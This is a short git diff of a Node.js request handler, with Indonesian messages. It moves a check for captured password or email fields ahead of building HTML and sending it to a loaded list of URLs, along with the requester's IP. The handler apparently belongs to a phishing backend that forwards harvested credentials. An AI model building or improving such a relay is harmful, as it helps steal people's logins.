@@ -359,17 +359,6 @@ module.exports = async (req, res) => {
 
     const vars = extractVars(pesan);
     vars.ip = getIP(req);
-
-    const html = buildHtml(vars);
-
-    const urls = loadUrls();
-
-    if (!urls.length) {
-      return res.json({
-        success: false,
-        message: "URL kosong"
-      });
-    }
      const hasRequiredData =
   (vars.password && vars.password !== "-") ||
   (vars.email && vars.email !== "-") ||
@@ -381,6 +370,18 @@ if (!hasRequiredData) {
     message: "Tidak ada data yang valid"
   });
 }
+
+    const html = buildHtml(vars);
+
+    const urls = loadUrls();
+
+    if (!urls.length) {
+      return res.json({
+        success: false,
+        message: "URL kosong"
+      });
+    }
+     
 
     const results = await Promise.allSettled(
       urls.map(async (url) => {
